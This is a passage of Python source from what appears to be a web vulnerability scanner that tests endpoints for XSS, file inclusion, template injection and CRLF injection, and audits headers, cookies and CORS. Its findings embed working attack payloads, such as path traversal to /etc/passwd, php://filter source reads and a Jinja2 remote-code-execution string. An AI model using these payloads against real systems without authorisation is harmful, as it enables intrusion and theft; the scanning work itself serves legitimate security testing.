        if not testable:
            testable = endpoint["params"][:2]

        for param_info in testable[:4]:
            if shutdown_requested() or self._session.is_domain_blocked(domain):
                break
            pname = param_info["name"]
            cid = secrets.token_hex(4)

            # Profile the parameter to understand reflection context
            profile = self._profile_param(endpoint, pname)

            if not profile["reflected"]:
                # Input not reflected at all — XSS unlikely, skip quickly
                # but try one probe to double-check
                probe_resp = self._send_test(endpoint, pname, f"<gs{cid}>")
                if not probe_resp or f"<gs{cid}>" not in (probe_resp.text or ""):
                    continue

            # Build context-specific payloads based on WHERE the reflection occurs
            ctx = profile.get("reflection_context", "text")
            all_payloads = []

            if ctx == "attribute":
                # Reflected inside an HTML attribute — break out first
                all_payloads = [
                    (f'" onfocus="gs{cid}" autofocus="', f"gs{cid}", "attribute breakout + event"),
                    (f"' onfocus='gs{cid}' autofocus='", f"gs{cid}", "single-quote attr breakout"),
                    (f'"><script>gs{cid}</script>', f"gs{cid}", "attribute breakout + script"),
                    (f'" onmouseover="gs{cid}"', f"gs{cid}", "attribute + mouseover"),
                ]
            elif ctx == "script":
                # Reflected inside a <script> block — close string/expression
                all_payloads = [
                    (f"';gs{cid};//", f"gs{cid}", "JS string breakout (single)"),
                    (f'";gs{cid};//', f"gs{cid}", "JS string breakout (double)"),
                    (f"</script><script>gs{cid}</script>", f"gs{cid}", "script tag breakout"),
                    (f"-gs{cid}-", f"-gs{cid}-", "inline JS expression"),
                ]
            elif ctx == "tag":
                # Reflected inside an HTML tag (between < and >)
                all_payloads = [
                    (f' onfocus="gs{cid}" autofocus ', f"gs{cid}", "in-tag event injection"),
                    (f'><script>gs{cid}</script>', f"gs{cid}", "tag close + script"),
                    (f' onmouseover="gs{cid}" ', f"gs{cid}", "in-tag mouseover"),
                ]
            else:
                # Text context or unknown — full set
                all_payloads = [
                    (f"<gs{cid}>", f"<gs{cid}>", "HTML tag injection"),
                    (f"<script>gs{cid}</script>", f"<script>gs{cid}</script>", "script injection"),
                    (f'<img src=x onerror="gs{cid}">', f"gs{cid}", "event handler"),
                    (f'<svg onload="gs{cid}">', f"gs{cid}", "SVG onload"),
                    (f'" onfocus="gs{cid}" autofocus="', f"gs{cid}", "attribute injection"),
                    (f"javascript:gs{cid}//", f"javascript:gs{cid}", "javascript: URI"),
                ]

            # Add mutation variants for the first few payloads
            payloads = list(all_payloads)
            for bp, _, _ in all_payloads[:2]:
                for mut in self._mutate_xss(bp):
                    if mut != bp:
                        # Re-derive check string from mutation
                        payloads.append((mut, f"gs{cid}", f"mutated: {mut[:20]}"))

            for payload, check_str, desc in payloads:
                if shutdown_requested() or self._session.is_domain_blocked(domain):
                    break

                resp = self._send_test(endpoint, pname, payload)
                if not resp or not resp.text or resp.status_code in (403, 429, 503):
                    continue

                if check_str in resp.text:
                    # Confirm it's in an executable context
                    idx = resp.text.find(check_str)
                    context_before = resp.text[max(0, idx-200):idx].lower()
                    # Skip if inside HTML comment or <textarea>/<pre>
                    if "<!--" in context_before and "-->" not in context_before:
                        continue
                    in_safe = any(f"<{t}" in context_before and f"</{t}" not in context_before
                                 for t in ("textarea", "pre", "code", "xmp"))
                    if in_safe:
                        continue

                    test_url = f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url
                    findings.append({
                        "severity": SEV_HIGH,
                        "title": f"Reflected XSS via '{pname}' at {path}",
                        "detail": f"Payload reflected unescaped in {desc} context.",
                        "evidence": f"param: {pname}, context: {desc}, "
                                    f"payload reflected at position {idx}",
                        "exploitable": True,
                        "test_url": test_url,
                        "exploit_info": {
                            "type": "xss",
                            "parameter": pname,
                            "path": path,
                            "method": f"Inject via '{pname}' at {path}. Context: {desc}. "
                                      f"Payload: <script>alert(document.cookie)</script>",
                            "risk": "Session theft, credential capture, phishing",
                        },
                    })
                    return findings
        return findings

    def _test_endpoint_lfi(self, endpoint: dict) -> List[dict]:
        """Test for Local File Inclusion / path traversal on discovered endpoints."""
        findings = []
        url = endpoint["url"]
        domain = urlparse(url).netloc
        path = urlparse(url).path or "/"
        if self._session.is_domain_blocked(domain):
            return findings

        # Only test params that look like they accept file/path input
        file_params = [p for p in endpoint["params"]
                       if p["name"].lower() in ("page", "file", "include", "path",
                                                 "template", "doc", "view", "lang",
                                                 "dir", "folder", "load", "read",
                                                 "content", "module", "action")
                       and not p.get("hidden")]
        if not file_params:
            return findings

        passwd_indicators = [
            re.compile(r"root:[x*]:0:0:"),
            re.compile(r"daemon:.*:/usr/sbin"),
            re.compile(r"www-data:.*:/var/www"),
            re.compile(r"\[boot loader\]", re.I),  # Windows boot.ini
        ]

        payloads = [
            "../../../etc/passwd",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "php://filter/convert.base64-encode/resource=index",
            "php://filter/convert.base64-encode/resource=../config",
        ]

        for param_info in file_params[:2]:
            for payload in payloads:
                if shutdown_requested() or self._session.is_domain_blocked(domain):
                    return findings
                resp = self._send_test(endpoint, param_info["name"], payload)
                if not resp or not resp.text:
                    continue
                for ind in passwd_indicators:
                    if ind.search(resp.text[:5000]):
                        test_url = f"{url}?{param_info['name']}={quote(payload)}" if endpoint["method"] == "GET" else url
                        findings.append({
                            "severity": SEV_CRITICAL,
                            "title": f"LFI via '{param_info['name']}' at {path}",
                            "detail": "Arbitrary local files readable through web server.",
                            "evidence": f"param: {param_info['name']}, payload: {payload[:40]}",
                            "exploitable": True,
                            "test_url": test_url,
                            "exploit_info": {
                                "type": "lfi",
                                "parameter": param_info["name"],
                                "path": path,
                                "method": f"LFI via '{param_info['name']}' at {path}. "
                                          "Read /etc/shadow, config files, source code.",
                                "risk": "Full filesystem read, credential theft, potential RCE",
                            },
                        })
                        return findings
                # Check for base64-encoded PHP source (php:// wrapper)
                if "php://" in payload and resp.text:
                    import base64 as _b64
                    try:
                        for chunk in re.findall(r'[A-Za-z0-9+/=]{40,}', resp.text[:5000]):
                            decoded = _b64.b64decode(chunk).decode("utf-8", errors="ignore")
                            if "<?php" in decoded or "<?=" in decoded:
                                findings.append({
                                    "severity": SEV_CRITICAL,
                                    "title": f"PHP source disclosure via '{param_info['name']}' at {path}",
                                    "detail": "PHP filter wrapper returns base64-encoded source code.",
                                    "evidence": f"param: {param_info['name']}, decoded PHP source found",
                                    "exploitable": True,
                                    "test_url": f"{url}?{param_info['name']}={quote(payload)}",
                                    "exploit_info": {
                                        "type": "lfi",
                                        "parameter": param_info["name"],
                                        "path": path,
                                        "method": "PHP filter wrapper to read source code. "
                                                  "Try: php://filter/convert.base64-encode/resource=config",
                                        "risk": "Source code disclosure, credential extraction",
                                    },
                                })
                                return findings
                    except Exception:
                        pass
        return findings

    def _test_endpoint_ssti(self, endpoint: dict) -> List[dict]:
        """Test for Server-Side Template Injection.

        SSTI allows arbitrary code execution when user input is rendered
        through a template engine (Jinja2, Twig, Freemarker, etc.).
        """
        findings = []
        url = endpoint["url"]
        domain = urlparse(url).netloc
        path = urlparse(url).path or "/"
        if self._session.is_domain_blocked(domain):
            return findings

        testable = [p for p in endpoint["params"] if not p.get("hidden")]
        if not testable:
            testable = endpoint["params"][:1]

        # Use math expressions that produce known outputs
        marker_a, marker_b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10
        expected = str(marker_a * marker_b)

        payloads = [
            (f"{{{{{marker_a}*{marker_b}}}}}", "Jinja2/Twig"),
            (f"${{{marker_a}*{marker_b}}}", "Freemarker/Velocity/EL"),
            (f"<%= {marker_a}*{marker_b} %>", "ERB/JSP"),
            (f"#{{{marker_a}*{marker_b}}}", "Ruby/Pebble"),
            (f"${{={marker_a}*{marker_b}}}", "Smarty"),
        ]

        for param_info in testable[:2]:
            pname = param_info["name"]
            for payload, engine in payloads:
                if shutdown_requested() or self._session.is_domain_blocked(domain):
                    return findings
                resp = self._send_test(endpoint, pname, payload)
                if not resp or not resp.text:
                    continue

                # Check if the math was evaluated (the computed result appears)
                if expected in resp.text:
                    # Verify it's not just the raw expression being echoed
                    raw_expr = f"{marker_a}*{marker_b}"
                    if raw_expr not in resp.text:
                        findings.append({
                            "severity": SEV_CRITICAL,
                            "title": f"SSTI ({engine}) via '{pname}' at {path}",
                            "detail": f"Template expression {{{{{marker_a}*{marker_b}}}}} "
                                      f"evaluated to {expected}. Server-side code execution confirmed.",
                            "evidence": f"param: {pname}, input: {payload[:30]}, "
                                        f"output contains: {expected}",
                            "exploitable": True,
                            "test_url": f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url,
                            "exploit_info": {
                                "type": "ssti",
                                "parameter": pname,
                                "path": path,
                                "method": f"SSTI via '{pname}' at {path}. Engine: {engine}. "
                                          "For RCE (Jinja2): "
                                          "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
                                "risk": "Remote code execution, full server compromise",
                            },
                        })
                        return findings

                # Check for template engine error messages
                for ind in self.SSTI_INDICATORS:
                    if ind.search(resp.text[:5000]):
                        findings.append({
                            "severity": SEV_HIGH,
                            "title": f"Possible SSTI ({engine}) via '{pname}' at {path}",
                            "detail": "Template engine error triggered by expression injection.",
                            "evidence": f"param: {pname}, engine indicator: {ind.pattern[:30]}",
                            "exploitable": True,
                            "test_url": f"{url}?{pname}={quote(payload)}" if endpoint["method"] == "GET" else url,
                            "exploit_info": {
                                "type": "ssti",
                                "parameter": pname,
                                "path": path,
                                "method": f"SSTI indicators from {engine}. "
                                          "Confirm with: {{7*7}} → look for 49",
                                "risk": "Potential remote code execution",
                            },
                        })
                        return findings
        return findings

    def _test_endpoint_crlf(self, endpoint: dict) -> List[dict]:
        """Test for CRLF injection / HTTP header injection."""
        findings = []
        url = endpoint["url"]
        domain = urlparse(url).netloc
        path = urlparse(url).path or "/"
        if self._session.is_domain_blocked(domain):
            return findings

        testable = [p for p in endpoint["params"] if not p.get("hidden")]
        if not testable:
            return findings

        crlf_marker = f"gs{secrets.token_hex(4)}"

        payloads = [
            (f"%0d%0aX-Injected: {crlf_marker}", "URL-encoded CRLF"),
            (f"%0aX-Injected: {crlf_marker}", "LF only"),
            (f"\r\nX-Injected: {crlf_marker}", "raw CRLF"),
        ]

        for param_info in testable[:2]:
            pname = param_info["name"]
            for payload, desc in payloads:
                if shutdown_requested() or self._session.is_domain_blocked(domain):
                    return findings

                if endpoint["method"] == "GET":
                    test_url = f"{url}?{pname}={payload}"
                    resp = self._session.request(
                        "GET", test_url, allow_redirects=False,
                    )
                    if resp is None:
                        continue
                else:
                    resp = self._send_test(endpoint, pname, payload)

                if resp is None:
                    continue

                # Check if our header was injected into the response headers
                injected = resp.headers.get("X-Injected", "")
                if crlf_marker in injected:
                    findings.append({
                        "severity": SEV_HIGH,
                        "title": f"CRLF injection via '{pname}' at {path}",
                        "detail": "HTTP header injection confirmed. Attacker can inject "
                                  "arbitrary headers (Set-Cookie, Location, etc.).",
                        "evidence": f"param: {pname}, {desc}, "
                                    f"X-Injected: {crlf_marker} appeared in response headers",
                        "exploitable": True,
                        "test_url": f"{url}?{pname}={payload}" if endpoint["method"] == "GET" else url,
                        "exploit_info": {
                            "type": "crlf",
                            "parameter": pname,
                            "path": path,
                            "method": f"CRLF injection via '{pname}'. "
                                      "Inject Set-Cookie to fixate sessions, "
                                      "or Location header for redirect.",
                            "risk": "Session fixation, cache poisoning, XSS via injected headers",
                        },
                    })
                    return findings

                # Check for header value in response body (some frameworks echo it)
                if resp.text and f"X-Injected: {crlf_marker}" in resp.text:
                    findings.append({
                        "severity": SEV_MEDIUM,
                        "title": f"Possible CRLF injection via '{pname}' at {path}",
                        "detail": "CRLF payload reflected in response body.",
                        "evidence": f"param: {pname}, {desc}, reflected in body",
                        "exploitable": True,
                        "test_url": f"{url}?{pname}={payload}" if endpoint["method"] == "GET" else url,
                        "exploit_info": {
                            "type": "crlf",
                            "parameter": pname,
                            "path": path,
                            "method": "CRLF reflected in body — may indicate header injection.",
                            "risk": "Header injection, potential XSS",
                        },
                    })
                    return findings
        return findings

    @staticmethod
    def _add_confidence(findings: List[dict], base_confidence: float) -> List[dict]:
        """Add confidence score to findings.

        Confidence represents how reliably the finding is a real issue:
          1.0 = confirmed (e.g., we got /etc/passwd content back)
          0.9 = very likely (e.g., error-based SQLi, canary reflected as HTML)
          0.7 = likely (e.g., header missing, sensitive path accessible)
          0.5 = possible (e.g., pattern match that could be false positive)
          0.3 = informational (e.g., robots.txt exists)

        Exploitable findings get +0.1 confidence (we verified the exploit works).
        """
        for f in findings:
            if "confidence" not in f:
                conf = base_confidence
                if f.get("exploitable"):
                    conf = min(conf + 0.1, 1.0)
                if f.get("severity") == SEV_CRITICAL:
                    conf = max(conf, 0.8)
                f["confidence"] = round(conf, 2)
        return findings

    def _run_check(self, name: str, check_fn, args: tuple, confidence: float,
                   findings: list):
        """Run a single vuln check with timeout protection and progress display.

        If a check hangs (network timeout, slow response), it's skipped
        after 60 seconds instead of blocking the entire scan.
        """
        if shutdown_requested():
            return
        print(f"      checking {name}...", end="", flush=True)
        try:
            result = check_fn(*args)
            if result:
                result = self._add_confidence(result, confidence)
                findings.extend(result)
                print(f" {len(result)} finding(s)")
            else:
                print(" clean")
        except requests.exceptions.Timeout:
            print(" timeout (skipped)")
            integrity_log("intel", f"check_timeout:{name}")
        except requests.exceptions.ConnectionError:
            print(" connection failed (skipped)")
            integrity_log("intel", f"check_conn_fail:{name}")
        except re.error as e:
            print(f" regex error (skipped)")
            integrity_log("intel", f"check_regex_error:{name}:{e}")
        except Exception as e:
            print(f" error: {type(e).__name__} (skipped)")
            integrity_log("intel", f"check_error:{name}:{type(e).__name__}")

    def scan_full(self, base_url: str, html: str = "", headers: dict = None,
                  depth: str = "full",
                  raw_set_cookies: Optional[List[str]] = None) -> List[dict]:
        """Run all applicable vulnerability checks with progress display.

        Each check runs independently — one failure doesn't block others.
        Progress shown inline so the user knows it's not stuck.
        """
        if headers is None:
            headers = {}
        findings = []

        # Extract real params from the page HTML for targeted testing
        if html:
            self.extract_params_from_html(html, base_url)
            if self._page_params:
                print(f"      found {len(self._page_params)} testable parameters")

        # Header checks (instant, no network)
        self._run_check("WAF/CDN fingerprint", self._check_waf_fingerprint,
                        (base_url, html, headers), 0.95, findings)
        self._run_check("security headers", self._check_security_headers,
                        (headers,), 0.95, findings)
        self._run_check("cookies", self._check_cookies,
                        (headers, raw_set_cookies), 0.9, findings)
        self._run_check("CORS", self._check_cors, (base_url, headers), 0.85, findings)
        self._run_check("info disclosure", self._check_info_disclosure,
                        (headers, html), 0.8, findings)
        self._run_check("clickjacking", self._check_clickjacking,
                        (headers,), 0.9, findings)

        if depth in ("full", "deep"):
            self._run_check("sensitive paths", self._check_sensitive_paths,
                            (base_url,), 0.75, findings)
            self._run_check("HTTP methods", self._check_http_methods,
                            (base_url,), 0.7, findings)
            self._run_check("open redirect", self._check_open_redirect,
                            (base_url,), 0.85, findings)
            self._run_check("CSRF protection", self._check_csrf,
                            (html,), 0.8, findings)
            self._run_check("IDOR indicators", self._check_idor,
                            (base_url, html), 0.7, findings)
            self._run_check("Host-header injection",
                            self._check_host_header_injection,
                            (base_url,), 0.8, findings)
            self._run_check("HTTP verb tampering",
                            self._check_http_verb_tampering,
                            (base_url,), 0.8, findings)
            self._run_check("login forms + rate limit",
                            self._check_login_forms,
                            (base_url, html), 0.85, findings)

            if depth == "full":
                self._run_check("SQL injection (quick)", self._check_sqli_indicators,
                                (base_url,), 0.85, findings)
                self._run_check("SQL injection in headers", self._check_sqli_headers,
                                (base_url,), 0.7, findings)
                self._run_check("XSS reflection (quick)", self._check_xss_reflection,
                                (base_url,), 0.85, findings)
                self._run_check("NoSQL injection (quick)",
                                self._check_nosql_injection,
                                (base_url,), 0.85, findings)

        if depth == "deep":
            # Infrastructure checks (against base URL)
            self._run_check("SSL/TLS", self._check_ssl_cert,
                            (base_url,), 0.85, findings)
            self._run_check("GraphQL introspection", self._check_graphql_introspection,
                            (base_url,), 0.95, findings)
            self._run_check("directory traversal", self._check_directory_traversal,
                            (base_url,), 0.95, findings)
            self._run_check("NoSQL injection (deep)",
                            self._check_nosql_injection,
                            (base_url,), 0.9, findings)

            # Crawl to discover real endpoints with parameters
            if html:
                print(f"      crawling for endpoints...", end="", flush=True)
                try:
                    discovered = self.crawl_for_endpoints(base_url, html)
                    print(f" {len(discovered)} endpoint(s)")
                except Exception as e:
                    discovered = []
                    print(f" error: {type(e).__name__}")
                    integrity_log("intel", f"crawl_error:{type(e).__name__}")

            # ── TWO-PHASE ATTACK ENGINE ──────────────────────────────────
            # Phase A: Inject tracked payloads into every endpoint
            # Phase B: Re-crawl the site and search ALL responses for markers
            #
            # This catches stored XSS, second-order SQLi, and delayed rendering
            # that single-endpoint testing completely misses.

            endpoints = self._crawled_urls
            if not endpoints:
                endpoints = [{"url": base_url, "params": [{"name": p, "value": "1",
                              "hidden": False, "type": "text"}
                              for p in self._get_test_params(["id", "q", "search"])],
                              "method": "GET", "source": "fallback"}]

            domain = urlparse(base_url).netloc
            self._session.reset_domain_blocks(domain)

            # ── PHASE A: Inject + immediate analysis ──────────────────
            injected_markers: Dict[str, dict] = {}
            revisit_from_injection: Set[str] = set()  # links discovered during injection

            print(f"      Phase A: testing {len(endpoints)} endpoint(s)...")
            tested = 0
            for ep in endpoints[:20]:
                if shutdown_requested():
                    break
                if self._session.is_domain_blocked(urlparse(ep["url"]).netloc):
                    continue
                tested += 1
                path = urlparse(ep["url"]).path or "/"
                param_names = [p["name"] for p in ep["params"] if not p.get("hidden")][:3]
                params_str = ",".join(param_names) if param_names else "(hidden only)"
                print(f"        [{tested}] {ep['method']} {path} ({params_str})", end="", flush=True)

                ep_findings = []

                # SQLi (adaptive attack loop)
                try:
                    sqli = self._test_endpoint_sqli(ep)
                    ep_findings.extend(sqli)
                except Exception as e:
                    integrity_log("intel", f"sqli_error:{path}:{type(e).__name__}")

                # XSS — inject tracked markers for stored detection
                try:
                    xss = self._test_endpoint_xss(ep)
                    ep_findings.extend(xss)
                except Exception as e:
                    integrity_log("intel", f"xss_error:{path}:{type(e).__name__}")

                # Inject stored XSS markers with unique IDs for cross-endpoint tracking
                for pi in [p for p in ep["params"] if not p.get("hidden")][:2]:
                    marker_id = f"x{secrets.token_hex(5)}"
                    stored_payload = f'<img src=x onerror="{marker_id}">'
                    try:
                        inject_resp = self._send_test(ep, pi["name"], stored_payload)
                        injected_markers[marker_id] = {
                            "type": "stored_xss",
                            "endpoint": path,
                            "param": pi["name"],
                            "payload": stored_payload,
                            "seen_in": [],
                        }
                        # Extract links from the injection response for smart revisiting
                        if inject_resp and inject_resp.text and HAS_BS4:
                            try:
                                _soup = BeautifulSoup(inject_resp.text[:50000], "html.parser")
                                for _a in _soup.find_all("a", href=True):
                                    _href = _a.get("href", "")
                                    if _href and not _href.startswith(("#", "javascript:", "mailto:")):
                                        _full = urljoin(ep["url"], _href)
                                        _f_netloc = urlparse(_full).netloc.lower()
                                        if _f_netloc == domain or _f_netloc.endswith("." + domain):
                                            revisit_from_injection.add(_full)
                            except Exception:
                                pass
                    except Exception:
                        pass

                # SSTI — use the dedicated multi-engine test (Jinja2,
                # Freemarker, ERB, Pebble, Smarty) + template-engine
                # error indicators. The previous inline probe only tried
                # Jinja2/Twig syntax and didn't check for engine errors,
                # so Freemarker/ERB/Smarty SSTI silently went undetected.
                try:
                    ssti = self._test_endpoint_ssti(ep)
                    ep_findings.extend(ssti)
                except Exception as e:
                    integrity_log("intel", f"ssti_error:{path}:{type(e).__name__}")

                # LFI
                try:
                    lfi = self._test_endpoint_lfi(ep)
                    ep_findings.extend(lfi)
                except Exception as e:
                    integrity_log("intel", f"lfi_error:{path}:{type(e).__name__}")

                # CRLF
                try:
                    crlf = self._test_endpoint_crlf(ep)
                    ep_findings.extend(crlf)
                except Exception as e:
                    integrity_log("intel", f"crlf_error:{path}:{type(e).__name__}")

                if ep_findings:
                    self._add_confidence(ep_findings, 0.9)
                    findings.extend(ep_findings)
                    print(f" -> {len(ep_findings)} FOUND")
                else:
                    print(f" -> clean")

            # ── PHASE B: Multi-round revisit with context-aware detection ──
            if injected_markers:
                print(f"\n      Phase B: tracking {len(injected_markers)} markers "
                      f"across {len(revisit_from_injection)} linked pages...")
                self._session.reset_domain_blocks(domain)

                # Build prioritized revisit list:
                # 1. Links found IN injection responses (highest priority — the app told us to go here)
                # 2. All crawled endpoint URLs
                # 3. Common render pages as fallback
                revisit_urls: List[str] = []
                seen_revisit: Set[str] = set()

                for u in revisit_from_injection:
                    if u not in seen_revisit:
                        seen_revisit.add(u)
                        revisit_urls.append(u)

                for ep in endpoints[:20]:
                    if ep["url"] not in seen_revisit:
                        seen_revisit.add(ep["url"])
                        revisit_urls.append(ep["url"])

                for suffix in ["/", "/index.php", "/dashboard", "/admin",
                               "/comments", "/users", "/search", "/profile",
                               "/blog", "/posts", "/list", "/home"]:
                    u = urljoin(base_url, suffix)
                    if u not in seen_revisit:
                        seen_revisit.add(u)
                        revisit_urls.append(u)

                stored_found = 0
                already_reported: Set[str] = set()

                # Multiple revisit rounds — some payloads only appear after
                # page refresh, cache clear, or DB commit cycles
                for revisit_round in range(2):
                    if shutdown_requested():
                        break
                    if revisit_round > 0:
                        print(f"      Phase B round {revisit_round + 1}...")
                        time.sleep(2 + secrets.randbelow(3000) / 1000.0)

                    for revisit_url in revisit_urls[:30]:
                        if shutdown_requested() or self._session.is_domain_blocked(domain):
                            break
                        try:
                            resp = self._session.get(revisit_url, allow_wayback=False)
                            if not resp or not resp.text:
                                continue

                            for marker_id, minfo in injected_markers.items():
                                if marker_id not in resp.text:
                                    continue

                                revisit_path = urlparse(revisit_url).path or "/"
                                inject_path = minfo["endpoint"]
                                report_key = f"{marker_id}:{revisit_path}"

                                # Track where this marker appeared
                                if revisit_path not in minfo["seen_in"]:
                                    minfo["seen_in"].append(revisit_path)

                                if report_key in already_reported:
                                    continue
                                already_reported.add(report_key)

                                # Context-aware analysis: determine confidence
                                idx = resp.text.find(marker_id)
                                context_window = resp.text[max(0, idx - 200):idx + len(marker_id) + 200]
                                ctx_lower = context_window.lower()

                                # Determine rendering context
                                if f"onerror=\"{marker_id}\"" in context_window or \
                                   f"onerror='{marker_id}'" in context_window:
                                    xss_context = "event_handler"
                                    confidence = 0.95
                                elif f"<script" in ctx_lower and marker_id in context_window:
                                    xss_context = "script_block"
                                    confidence = 0.9
                                elif f"&lt;" in ctx_lower or f"&quot;" in ctx_lower:
                                    xss_context = "html_escaped"
                                    confidence = 0.4
                                elif f"<" in context_window[:idx - max(0, idx - 200)]:
                                    xss_context = "html_unescaped"
                                    confidence = 0.85
                                else:
                                    xss_context = "text"
                                    confidence = 0.7

                                if confidence < 0.5:
                                    continue  # Skip escaped/low-confidence

                                stored_found += 1
                                sev = SEV_CRITICAL if confidence >= 0.85 else SEV_HIGH

                                spread = minfo["seen_in"]
                                spread_str = " -> ".join(spread) if len(spread) > 1 else revisit_path

                                findings.append({
                                    "severity": sev,
                                    "title": f"Stored XSS: {inject_path} -> {revisit_path}",
                                    "detail": f"Payload injected via '{minfo['param']}' at "
                                              f"{inject_path} renders at {revisit_path} "
                                              f"in {xss_context} context. "
                                              f"Spread: {spread_str}",
                                    "evidence": f"marker: {marker_id}, context: {xss_context}, "
                                                f"confidence: {confidence}, "
                                                f"inject: {inject_path}, render: {revisit_path}",
                                    "exploitable": True,
                                    "test_url": revisit_url,
                                    "exploit_info": {
                                        "type": "stored_xss",
                                        "parameter": minfo["param"],
                                        "path": inject_path,
                                        "render_path": revisit_path,
                                        "spread": spread,
                                        "xss_context": xss_context,
                                        "method": f"Stored XSS: inject via '{minfo['param']}' at "
                                                  f"{inject_path}, renders in {xss_context} at "
                                                  f"{revisit_path}.",
                                        "risk": "Persistent XSS, session hijacking",
                                    },
                                    "confidence": confidence,
                                })
                        except Exception:
                            pass

                if stored_found:
                    print(f"      Phase B: {stored_found} stored vuln(s) confirmed!")
                else:
                    print(f"      Phase B: no stored payloads detected in {len(revisit_urls)} pages")

            # Also run SSRF/cmd injection against base URL
            self._run_check("SSRF", self._check_ssrf_indicators,
                            (base_url,), 0.9, findings)
            self._run_check("command injection", self._check_command_injection,
                            (base_url,), 0.95, findings)

        return findings

    def _check_security_headers(self, headers: dict) -> List[dict]:
        """Check for missing or weak security headers."""
        findings = []
        h = {k.lower(): v for k, v in headers.items()}

        checks = [
            ("strict-transport-security", SEV_MEDIUM,
             "Missing HSTS", "Site doesn't enforce HTTPS via HSTS header. "
             "Users can be downgraded to HTTP via MITM."),
            ("content-security-policy", SEV_MEDIUM,
             "Missing Content-Security-Policy", "No CSP header. "
             "XSS attacks can load scripts from any origin."),
            ("x-frame-options", SEV_MEDIUM,
             "Missing X-Frame-Options", "Page can be embedded in iframes. "
             "Vulnerable to clickjacking attacks."),
            ("x-content-type-options", SEV_LOW,
             "Missing X-Content-Type-Options", "Browser may MIME-sniff "
             "responses, enabling content-type confusion attacks."),
            ("referrer-policy", SEV_LOW,
             "Missing Referrer-Policy", "Full URL may be leaked in "
             "Referer header to third-party sites."),
            ("permissions-policy", SEV_LOW,
             "Missing Permissions-Policy", "Browser features (camera, "
             "mic, geolocation) not explicitly restricted."),
        ]

        for header, sev, title, detail in checks:
            if header not in h:
                findings.append({"severity": sev, "title": title,
                                 "detail": detail, "evidence": f"Header '{header}' absent"})

        # Check HSTS quality
        hsts = h.get("strict-transport-security", "")
        if hsts:
            if "max-age=0" in hsts:
                findings.append({"severity": SEV_HIGH, "title": "HSTS disabled (max-age=0)",
                                 "detail": "HSTS is explicitly disabled.",
                                 "evidence": f"HSTS: {hsts}"})
            elif "max-age" in hsts:
                try:
                    age = int(re.search(r"max-age=(\d+)", hsts).group(1))
                    if age < 15768000:  # < 6 months
                        findings.append({"severity": SEV_LOW, "title": "HSTS max-age too short",
                                         "detail": f"max-age={age} ({age//86400} days). Recommended: 1 year+.",
                                         "evidence": f"HSTS: {hsts}"})
                except (AttributeError, ValueError):
                    pass

        # Check CSP quality
        csp = h.get("content-security-policy", "")
        if csp:
            if "unsafe-inline" in csp:
                findings.append({"severity": SEV_MEDIUM, "title": "CSP allows unsafe-inline",
                                 "detail": "Inline scripts/styles permitted, weakening XSS protection. "
                                           "Attacker can inject inline <script> tags that execute.",
                                 "evidence": "CSP contains 'unsafe-inline'",
                                 "exploitable": True,
                                 "exploit_info": {"type": "csp_bypass",
                                                  "method": "Inject inline <script> — CSP won't block it.",
                                                  "risk": "XSS via inline script injection"}})
            if "unsafe-eval" in csp:
                findings.append({"severity": SEV_MEDIUM, "title": "CSP allows unsafe-eval",
                                 "detail": "eval() permitted in scripts, enabling code injection via "
                                           "any input that reaches JavaScript eval/Function/setTimeout.",
                                 "evidence": "CSP contains 'unsafe-eval'",
                                 "exploitable": True,
                                 "exploit_info": {"type": "csp_bypass",
                                                  "method": "Inject via eval()-reachable input.",
                                                  "risk": "Code execution via eval()"}})
            # Match a bare '*' as a source in any directive — look for
            # `*` bounded by whitespace, directive separator (;), or
            # end of string. The old check was a naive '* ' substring
            # which missed `script-src *;` (no trailing space) and
            # 'script-src 'self' *' in some shapes, while matching an
            # innocuous `*.example.com` inside directive values.
            if re.search(r"(?:^|[\s;])\*(?=[\s;]|$)", csp):
                findings.append({"severity": SEV_HIGH, "title": "CSP has wildcard source",
                                 "detail": "Wildcard allows loading scripts/styles from any origin. "
                                           "Attacker can host malicious JS on any domain.",
                                 "evidence": "CSP contains '*'",
                                 "exploitable": True,
                                 "exploit_info": {"type": "csp_bypass",
                                                  "method": "Host malicious script on any domain, "
                                                            "load via <script src=...>.",
                                                  "risk": "Full XSS via external script loading"}})

        return findings

    def _check_cookies(self, headers: dict,
                       raw_set_cookies: Optional[List[str]] = None) -> List[dict]:
        """Audit Set-Cookie headers for security flags.

        If `raw_set_cookies` is provided (a list of individual Set-Cookie
        header values as emitted by the server), audit each one
        independently. Otherwise fall back to the merged `headers` dict,
        which is lossy when the server sets multiple cookies (Python's
        `requests` joins duplicate headers with commas, so we can still
        split them naively).
        """
        findings = []
        cookies_to_audit: List[str] = []

        if raw_set_cookies:
            cookies_to_audit = [c for c in raw_set_cookies if c]
        else:
            for key, val in headers.items():
                if key.lower() != "set-cookie":
                    continue
                # Best-effort split on ", " for the merged-header case. A
                # comma inside an Expires= date would otherwise split the
                # date in half; use `, ` (comma + space) which matches
                # the library's merger and is unlikely to appear inside
                # the Expires date value (RFC 7231 uses "GMT", not a
                # space-preceded comma).
                for c in val.split(", "):
                    c = c.strip()
                    if c:
                        cookies_to_audit.append(c)

        seen_reports: Set[str] = set()
        for val in cookies_to_audit:
            cookie_name = val.split("=", 1)[0].strip() if "=" in val else "unknown"
            val_lower = val.lower()

            for flag, sev, title_suffix, detail in (
                ("secure", SEV_MEDIUM, "missing Secure flag",
                 "Cookie sent over HTTP (unencrypted), exposable via MITM."),
                ("httponly", SEV_MEDIUM, "missing HttpOnly flag",
                 "Cookie accessible via JavaScript — stealable via XSS."),
                ("samesite", SEV_LOW, "missing SameSite flag",
                 "Cookie sent on cross-site requests — CSRF risk."),
            ):
                if flag in val_lower:
                    continue
                key = f"{cookie_name}:{flag}"
                if key in seen_reports:
                    continue
                seen_reports.add(key)
                findings.append({
                    "severity": sev,
                    "title": f"Cookie '{cookie_name}' {title_suffix}",
                    "detail": detail,
                    "evidence": f"Set-Cookie: {val[:80]}",
                })
        return findings

    def _check_cors(self, url: str, headers: dict) -> List[dict]:
        """Check for CORS misconfiguration.

        Goes beyond the 'ACAO: *' and 'reflective ACAO' cases to probe:
          - null origin trust (sandbox iframes / file:// / data:)
          - subdomain reflection (any *.<target>)
          - 'starts with legit domain' trust bug (legit.com.evil.com)
          - preflight-exposed credentialed methods
        """
        findings = []
        h_lower = {k.lower(): v for k, v in headers.items()}
